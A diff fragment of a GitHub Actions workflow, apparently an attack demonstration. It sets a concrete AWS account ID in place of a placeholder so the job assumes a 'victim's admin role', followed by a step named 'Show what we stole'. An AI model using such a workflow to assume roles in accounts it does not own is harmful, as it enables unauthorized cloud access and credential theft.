@@ -12,7 +12,7 @@ jobs:
       - name: Assume the victim's admin role
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: arn:aws:iam::YOUR_ACCOUNT_ID:role/gha-deploy-role
+          role-to-assume: arn:aws:iam::776566309511:role/gha-deploy-role
           aws-region: us-east-1
 
       - name: Show what we stole
